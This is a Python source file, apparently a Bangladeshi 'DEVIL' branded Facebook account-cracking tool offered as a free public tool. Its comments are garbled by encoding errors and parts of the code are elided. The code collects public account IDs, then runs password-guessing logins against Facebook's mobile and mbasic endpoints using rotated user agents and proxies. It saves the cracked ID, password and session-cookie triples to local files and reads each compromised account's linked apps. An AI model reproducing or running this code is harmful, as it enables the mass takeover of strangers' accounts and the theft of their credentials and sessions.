#COPY_CUTERS MARA KHAWЁЯдгЁЯШВЁЯдг
...
#ржПржЗ ржЯрзБрж▓рж╕ ржЕржирзЗржХрзЗржЗ ржХржкрж┐ ржХрж░ржЫрзЗ ржнрж╛рж▓рзЛ ржХрж░рзЗ ржжрзЗржЦрж▓рзЗржЗ ржЪрж┐ржирзНрждрзЗ ржкрж╛рж░ржмрзЗржи

#ржЯрзБрж▓рж╕ ржХржкрж┐ ржХрж░рзЗ ржЯржк рж╣рзЯрзЗ ржпрж╛ржУЁЯдгЁЯШВ

#ржХржкрж┐ ржХрж╛ржЯрж╛рж░рзЗрж░ ржжрж┐ржи рж╢рзЗрж╖  ржУржкрзЗржи рж╕рзЛрж░рзНрж╕ ржПрж░ ржмрж╛ржВрж▓рж╛ржжрзЗрж╢ ЁЯШВЁЯдг
...
#Chnge Name 
	print('[[\x1b[1;92mDEVIL\x1b[1;97m] [\x1b[1;97mMR-QURESHI-XD]')
...
def uaku():
	try:
		...
		a=requests.get('https://github.com/DEVIL-NAJMUL/Bb/blob/main/bbnew.txt').text
		ua=open('.bbnew.txt','w')
...
\033[1;32m╚══════════════════════════════════════════════════════════╝
\033[1;32m╔══════════════════════════════════╗╔══════════════════════╗
\033[1;32m║NOTE : \033[37;41mPUBLIC FREE TOOL\033[0;m\033[1;32m         ║║        \x1b[1;91m___T_\033[1;32m         ║
...
def menu(my_name,my_id):
	...
	alvino_xy(f'{h}IP  : {ip}')
	cetak(nel('\t[bold cyan]           DEVIL CHOOSE CLONING MENU DEVIL [/bold cyan]'))
	print('')
	cetak(nel('[bold green] тЭдя╕П1. CRACK PUBLIK ID\n  тЭдя╕П2. CHEK RESULTS\n тЭдя╕П0. EXIT [bold green]')) 
	_____cowok__DEVIL_____ = input('\n CHOOSE : ')
	if _____cowok__DEVIL_____ in ['1']:
		dump_massal()
	elif _____cowok__DEVIL_____ in ['2']:
		result()
	elif _____cowok__DEVIL_____ in ['3']:
		dump_massal()
	elif _____cowok__DEVIL_____ in ['4']:
		crack_file()
	elif _____cowok__DEVIL_____ in ['5']:
		result()
	elif _____cowok__DEVIL_____ in ['0']:
...
def dump_massal():
	...
	try:
		print('')
		print(f'{k}=>TOTAL IDтШЕ{b}'+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print(f'{u}')
		...
		print(f'тЮе=>{k} IF ID IS PUBLIC THEN TRY AGAIN WITH NEW COOKIE OTHRWSE CHEK YOUR ID LNK {u}')
		time.sleep(3)
		back()
#-------------------[ CRACK-PENGIKUT ]----------------#
def dump_pengikut():
...
#-------------[ Id -Crackiing]---------------#
def setting():
	cetak(nel('\t[bold cyan]         CLONING MENU DEVIL [/bold cyan]'))
	print('') 
	cetak(nel('[bold yellow]тЭдя╕ПтЮг1. CLONE JUST OLD IDZ \nтЭдя╕ПтЮг2. CLONE JUST NEW IDZ(RECOMEND)\nтЭдя╕ПтЮг3. CLONE MIX IDZ (NEW/OLD)=>RECOMEND [bold yellow]'))
	print('')
	hu = input('=>CHOOSE : ')
	if hu in ['1','01']:
		...
		print('=>TRY AGAIN')
		exit()
	cetak(nel('\t[bold cyan]             DEVIL METHODE LOGIN DEVIL [/bold cyan]'))
	print('') 
	cetak(nel('[bold purple]тЭдя╕ПтЮг1. MOBILE\nтЭдя╕ПтЮг2. MBASIC\nтЭдя╕ПтЮг3. TOUCH\nтЭдя╕ПтЮг4. MTOUCH [bold purple]')) 
	print('')
	hc = input('>> CHOOSE : ')
	if hc in ['1','01']:
...
#   elif _jembot_ in ['y','Y']:
	...
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		cetak(nel('[[purple]DEVIL[yellow]] ADD PASWORD MXM 6 WORDS\n[[purple]DEVIL[yellow]] EXIMPLE :[green] 556677,786786,123456[purple] '))
...
#-------------------[ BAGIAN-WORDLIST ]------------#
def passwrd():
	cetak(nel('[bold cyan]               WAIT FOR A WHILE ЁЯШВ[bold cyan]')) 
	print(f'                    {m}H {k}A {h}R {u}A {b}P {u}  тШЕ  {b}S {u}A {h} B{k} A{m} R{b}')
	print('')
	...
	print(f'[{h}DEVIL{u}]{h} OK : {h}%s '%(ok))
	print(f'{k}[{k}DEVIL{h}]{k} CP : {k}%s{u} '%(cp))
	print('')
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{b}DEVIL-XD-->{P}[{k}{loop}{P}/{h}{len(id)}{P}]тАФ{P}[{H}{ok}{P}]тАФ{P}[{k}{cp}{x}]тАФ[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				cetak(nel('  [red]      DEVIL-CHECKPOINT  [red]'))
				...
				cetak(nel('[green]     DEVIL-OK🔥 [green]')) 
...
def crackfree(idf,pwv):
	global loop,ok,cp
	sys.stdout.write(f"\ {P}[{asu}Mbasic{P}]{P}[{b}{loop}{P}/{p}{len(id)}{P}]тАФ{P}[{H}{ok}{P}]тАФ{P}[{k}{cp}{x}]тАФ[{m}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			...
			po = ses.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				cetak(nel('  [red]     ЁЯШн MOHON MAAF ANDA BELUM BERUNTUNG MOHON BERSABAR ЁЯШн[red]'))
				print(f'\r{K}>> {idf}|{pw}{N}')     
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				...
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				cetak(nel('[purple]      HELLO DEVIL TOOL [purple]')) 
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					...
					open('/sdcard/DEVIL-DATA/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					cp+=1
				else:continue
				break
				...
				if 'no' in taplikasi:
					...
					print('\n')
					statusok = f'[DEVIL] ID       : {idf}\n PASSWORD : {pw}\n COOKIES  : {kuki}'
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='DEVIL OK'))
					ok+=1
					break
				elif 'ya' in taplikasi:
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('/sdcard/DEVIL-DATA/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					user=idf
					infoakun = ""
					session = requests.Session()
					cek2 = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies=coki,headers=headapp).text
					cek =session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies=coki,headers=headapp).text
					infoakun += (f"\n[bold cyan][DEVIL] LIST ACTIVE APPLICATIONS :[/bold cyan] \n")
					...
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='[bold green]DEVIL OK[/bold green]'))
					ok+=1
					break
...
def crackmbasic(idf,pwv):
	...
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	sys.stdout.write('\r%s%s/%s OK:%sCP:%s%s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x));sys.stdout.flush()
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					...
					print('\n')
					statuscp = f'[DEVIL] ID       : {idf} [DEVIL] PASSWORD : {pw}'
					statuscp1 = nel(statuscp, style='red')
					cetak(nel(statuscp1, title='DEVIL-XD CP'))
					open('/sdcard/DEVIL-DATA/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					cp+=1
				else:continue
				...
				if 'no' in taplikasi:
					...
					hit=0
					infoakun += (f"\n[bold yellow][DEVIL] LIST EXPIRED APPLICATIONS :[/bold yellow]\n")
					apkexp=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek2))
					hit=0
					for muncul in apkexp:
						hit+=1
						infoakun += (f"[bold yellow][{hit}] {muncul[0]} {muncul[1]}[/bold yellow]\n")
					print('\n')
					statusok = f'[bold green][DEVIL] ID       : {idf}\n[DEVIL] PASSWORD : {pw}\n[DEVIL] COOKIES  : {kuki}[/bold green]\n{infoakun}'
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='[bold green]DEVIL-XD OK[/bold green]'))
					ok+=1
					break
			else:
				continue
